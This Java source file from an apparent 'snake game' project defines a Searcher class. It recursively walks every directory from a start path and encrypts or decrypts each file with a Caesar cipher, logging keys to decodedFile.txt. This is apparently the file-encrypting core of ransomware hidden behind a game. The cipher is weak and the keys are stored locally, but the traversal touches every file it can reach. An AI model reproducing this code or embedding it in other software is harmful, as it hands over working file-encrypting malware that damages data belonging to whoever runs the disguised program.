package me.herrlestrate.snakegame.crypto;

import me.herrlestrate.snakegame.Game;

import java.io.*;
import java.util.Objects;
import java.util.Scanner;

public class Searcher {

    private static File decodedFile;
    private static FileWriter fileWriter;
    private static Scanner fileReader;

    public Searcher(){
        if(Game.getAction().equalsIgnoreCase("decrypt")){
            initInputDecodedFile();
        } else {
            initOutputDecodedFile();
        }


    }

    public void start(String startPath){
        if(!decodedFile.exists()){
            System.err.println("Decoded file not found!");
            return;
        }

        for(File target : Objects.requireNonNull((new File(startPath)).listFiles())){
            if(target.isDirectory()){
                start(target.getAbsolutePath());
                continue;
            }

            if(target.getAbsolutePath().equalsIgnoreCase(Game.getRoot()+"decodedFile.txt")){
                continue;
            }

            if(Game.getAction().equalsIgnoreCase("decrypt")){
                System.out.println(target.getAbsolutePath());
                String[] args = Searcher.getKeysDecodedFile().split(" ");
                new Caesar().decryptFile(target,args);
            } else {
                new Caesar().encryptFile(target);
            }
        }
    }

    private void initInputDecodedFile(){
        decodedFile = new File(Game.getRoot()+"decodedFile.txt");
        if(!decodedFile.exists()){
            System.out.println("File not exists!");
            return;
        }

        try {
            fileReader = new Scanner(decodedFile);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void initOutputDecodedFile(){
        decodedFile = new File(Game.getRoot()+"decodedFile.txt");
        if(decodedFile.exists()){

            if(!decodedFile.delete()){
                System.err.println("Error while creating decodedFile");
                return;
            }
        }

        try {
            if(!decodedFile.createNewFile()){
                System.err.println("Cannot create decodedFile");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            fileWriter = new FileWriter(decodedFile);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    static void updateDecodedFile(String key){
        try {
            fileWriter.write(key+"\n");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String getKeysDecodedFile(){
        return fileReader.nextLine();
    }

    public static void closeDecodedFile(){
        try {
            if(fileReader != null)
                fileReader.close();
            if(fileWriter != null)
                fileWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
